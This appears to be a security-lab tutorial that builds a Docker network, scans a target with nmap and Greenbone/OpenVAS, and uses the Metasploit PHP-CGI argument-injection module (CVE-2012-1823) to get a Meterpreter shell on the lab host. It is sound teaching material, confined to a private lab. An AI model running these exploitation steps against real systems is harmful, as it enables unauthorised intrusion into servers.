## Setup

***

Our system this time around is

```yaml
version: '3'

services:
  alice:
    image: # private image
    container_name: alice
    tty: true
    networks:
      channel:
        ipv4_address: 10.0.0.2

  nmap:
      image: # private image
      container_name: nmap
      stdin_open: true
      tty: true
      networks:
        channel:
          ipv4_address: 10.0.0.3

  metasploit:
    image: strm/metasploit
    container_name: metasploit
    stdin_open: true
    tty: true
    networks:
      channel:
        ipv4_address: 10.0.0.4

  openvas:
      image: mikesplain/openvas
      container_name: openvas
      ports:
        - "443:443"
      networks:
        channel:
          ipv4_address: 10.0.0.5
             
networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

The target system is Alice so we start the container:

```
$ docker-compose up -d alice
```

<br>

## Reconnaissance

***

We first do some reconnaissance getting information such as
OS fingerprinting using nmap:

```
$ docker-compose up -d nmap
$ docker exec -it nmap bash
```

in this interactive shell, we can run

```
# nmap -O -sV -p0-4096
```

where we use

- `-O` to enable OS detection
- `-sV` get service/version info on ports checked
- `p0-4096` to check ports 0 to 4096

our output is

```

```

We can also use greenbone to scan for vulnerabilities. In a separate terminal we run

```
$ docker-compose up openvas
```

Once it completes go to `https://localhost` and you will be greeted with the following screen.

| *Greenbone greeting screen* |

## Using Greenbone

***

The default login is `admin` for both fields and we reach the main interface.

|![pt2]|
|:--:|
| *Greenbone main interface* |

We navigate to Scans > Tasks and use the task wizard to scan the target (10.0.0.2).

|![pt3]|
|:--:|
| *Greenbone tasks screen* |

Once completed, checking our report (under Scans > Reports) we see there are several
high severity vulnerabilities. In order to study these further, we export the report.

| *Greenbone reports screen* |

## Running the Metasploit Module

***

In the report, we notice a few things including a weak password but for the purpose of
this exercise we will focus on vulnerability present in the CGI module of PHP.
In the report we see a few CVE references including `CVE-2012-1823`.

We can look up this reference on [CVE details](https://www.cvedetails.com/)
and find [the page](https://www.cvedetails.com/cve/CVE-2012-1823)
containing information we're interested in.

On it, we find a reference to a metasploit module to exploit this
vulnerability `exploit/multi/http/php_cgi_arg_injection`. We can now proceed
to run this exploit. First, run the container used to execute the exploit

```
$ docker-compose run metasploit
```

you should have an interface similar to

```
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.6-dev-eeed14d                   ]
+ -- --=[ 1856 exploits - 1052 auxiliary - 326 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 >
```

from here, we load the exploit module

```
> use exploit/multi/http/php_cgi_arg_injection
```

check the required options

```
msf5 exploit(multi/http/php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Here, all the required settings look fine except the target address which is not set.
That can be quickly remedied

```
msf5 exploit(multi/http/php_cgi_arg_injection) > set RHOST 10.0.0.2
RHOST => 10.0.0.2
```

now we're all set and can run the exploit

```
> exploit
```

This opens a Meterpreter session. To open a shell, we can simply type

```
> shell
```

and a shell is created. We have successfully broken into the target

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
